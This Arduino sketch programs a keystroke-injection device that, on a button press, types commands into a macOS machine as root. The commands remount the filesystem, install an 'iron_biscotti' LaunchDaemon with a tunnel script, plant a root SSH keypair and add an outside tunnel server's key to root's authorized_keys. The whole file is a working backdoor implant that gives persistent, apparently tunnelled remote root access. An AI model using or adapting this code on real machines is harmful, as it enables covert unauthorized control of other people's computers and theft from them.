#include "launch_daemon.h"
#include "file_utils.h"
#include "ssh_keys.h"

char buffer[2048];

void AddTunnelServerKey() {
  TypeString("echo \"");
  strcpy_P(buffer, ssh_tunnel_server_public_key);
  TypeString(buffer);
  EnterCommand("\" >> /var/root/.ssh/authorized_keys");
  EnterCommand("chmod 644 /var/root/.ssh/authorized_keys");
}

void IronBiscotti() {
  // Mount the filesystem
  EnterCommand("mount -uw /");
  delay(5);
  // Set the home var so vim doesn't trip
  EnterCommand("export HOME=/var/root/");
  // Generate host keys
  EnterCommand("ssh-keygen -A");
  // Setup ssh
  strcpy_P(buffer, ssh_setup);
  TypeString(buffer);
  // Setup launch daemon
  EnterCommand("mkdir -p /var/root/,iron_biscotti/");
  strcpy_P(buffer, iron_biscotti_sh);
  WriteToFile("/var/root/,iron_biscotti/iron_biscotti.sh", buffer, "755", "root", "wheel");
  delay(5);
  strcpy_P(buffer, tunnel_sh);
  WriteToFile("/var/root/,iron_biscotti/tunnel.sh", buffer, "755", "root", "wheel");
  delay(5);
  strcpy_P(buffer, com_iron_biscotti_plist);
  WriteToFile("/Library/LaunchDaemons/com.iron_biscotti.plist", buffer, "644", "root", "wheel");
  delay(5);
  EnterCommand("mkdir -p /var/root/,ssh/");
  strcpy_P(buffer, ssh_private_key);
  WriteToFile("/var/root/,ssh/id_rsa", buffer, "400", "root", "root");
  delay(5);
  strcpy_P(buffer, ssh_public_key);
  WriteToFile("/var/root/,ssh/id_rsa.pub", buffer, "644", "root", "root");
  delay(5);
  AddTunnelServerKey();
  EnterCommand("launchctl load -w /Library/LaunchDaemons/com.iron_biscotti.plist");
}

void setup() {
  // Begining the Keyboard stream
  Keyboard.begin();
  // pushbutton setup
  pinMode(8, INPUT);
  delay(100);
}

void loop() {
  if(digitalRead(8) == HIGH) {
    IronBiscotti();
  }
  delay(250);
}
